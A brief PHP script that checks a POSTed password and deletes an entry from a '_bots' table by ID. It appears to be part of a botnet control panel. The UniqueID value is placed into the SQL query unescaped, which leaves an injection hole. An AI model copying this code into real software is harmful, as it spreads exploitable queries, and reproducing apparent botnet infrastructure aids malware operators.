<?php
require("config.php.inc");
$uniqueid = $_POST["uniqueid"];
$passx = mysql_real_escape_string($_POST['password']);
if ( $password == $passx ) {
mysql_query("DELETE FROM _bots WHERE UniqueID='$uniqueid'") 
or die();  
}
?>